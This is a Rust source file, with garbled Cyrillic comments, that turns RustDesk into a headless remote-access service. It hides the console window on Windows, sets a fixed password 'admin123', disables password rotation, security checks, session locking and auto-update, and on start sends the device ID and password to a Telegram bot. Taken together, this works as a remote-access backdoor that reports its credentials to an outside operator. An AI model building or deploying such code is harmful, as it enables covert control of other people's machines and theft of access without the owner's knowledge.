#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

use librustdesk::*;
use hbb_common::config::Config;
use std::thread;
use std::time::Duration;

// –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram –±–æ—Ç–∞
const TELEGRAM_BOT_TOKEN: &str = "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID: &str = "YOUR_CHAT_ID_HERE";
const STATIC_PASSWORD: &str = "admin123";

fn main() {
    start_headless_with_telegram();
}

fn start_headless_with_telegram() {
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    if !common::global_init() {
        eprintln!("üö´ Global initialization failed.");
        return;
    }

    // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–∞—Ä–æ–ª—è
    setup_static_config();

    // –ü–æ–ª—É—á–∞–µ–º ID —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    let id = Config::get_id();

    println!("üöÄ RustDesk Headless Service Starting...");
    println!("üì± Your ID: {}", id);
    println!("üîë Static Password: {}", STATIC_PASSWORD);

    // –¢–µ—Å—Ç–∏—Ä—É–µ–º –±–∞–∑–æ–≤—ã–µ —Å–µ—Ä–≤–∏—Å—ã
    common::test_rendezvous_server();
    common::test_nat_type();

    // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä –≤ —Ñ–æ–Ω–µ
    start_server_headless();

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
    send_to_telegram(&id, STATIC_PASSWORD);

    // –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
    run_headless_loop();
}

fn setup_static_config() {
    use hbb_common::config::LocalConfig;

    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–∞—Ä–æ–ª—å
    LocalConfig::set_option("password", STATIC_PASSWORD.to_string());

    // –û—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫—É—é —Å–º–µ–Ω—É –ø–∞—Ä–æ–ª—è
    LocalConfig::set_option("auto-change-password", "N".to_string());

    // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è headless —Ä–µ–∂–∏–º–∞
    LocalConfig::set_option("enable-audio", "Y".to_string());
    LocalConfig::set_option("show-remote-cursor", "Y".to_string());
    LocalConfig::set_option("lock-after-session-end", "N".to_string());
    LocalConfig::set_option("allow-auto-update", "N".to_string());
    LocalConfig::set_option("security-check", "N".to_string());
}

fn start_server_headless() {
    // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    thread::spawn(|| {
        println!("üîÑ Starting RustDesk server...");
        crate::start_server(true, false);
        println!("‚úÖ RustDesk server started successfully");
    });
}

fn send_to_telegram(id: &str, password: &str) {
    thread::spawn(move || {
        // –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å–µ—Ä–≤–µ—Ä–∞
        thread::sleep(Duration::from_secs(10));

        let message = format!(
            "ü§ñ RustDesk Connection Ready!\n\nüì± Device ID: `{}`\nüîë Password: `{}`\n\nüíª Connect using RustDesk client",
            id, password
        );

        match send_telegram_message(&message) {
            Ok(_) => println!("‚úÖ Credentials sent to Telegram"),
            Err(e) => eprintln!("‚ùå Failed to send to Telegram: {}", e),
        }
    });
}

fn send_telegram_message(message: &str) -> Result<(), Box<dyn std::error::Error>> {
    let url = format!(
        "https://api.telegram.org/bot{}/sendMessage",
        TELEGRAM_BOT_TOKEN
    );

    let client = reqwest::blocking::Client::new();
    let params = [
        ("chat_id", TELEGRAM_CHAT_ID),
        ("text", message),
        ("parse_mode", "Markdown")
    ];

    let response = client.post(&url).form(&params).send()?;

    if response.status().is_success() {
        Ok(())
    } else {
        Err(format!("HTTP {}: {}", response.status(), response.text()?).into())
    }
}

fn run_headless_loop() {
    println!("üéØ Headless mode activated");
    println!("üì° Ready for incoming connections...");

    // –ü—Ä–æ—Å—Ç–æ–π keep-alive —Ü–∏–∫–ª
    let mut counter = 0;
    loop {
        thread::sleep(Duration::from_secs(30));
        counter += 1;

        // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π –≤—ã–≤–æ–¥ —Å—Ç–∞—Ç—É—Å–∞
        if counter % 20 == 0 {
            println!("üíì Headless service running... ({} minutes)", counter / 2);
        }
    }
}

// –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è —Ç–æ—á–∫–∞ –≤—Ö–æ–¥–∞ –¥–ª—è Android
#[cfg(target_os = "android")]
#[no_mangle]
pub extern "C" fn android_main(_app: winit::platform::android::activity::AndroidApp) {
    println!("üì± Android headless service starting...");
    start_headless_with_telegram();
}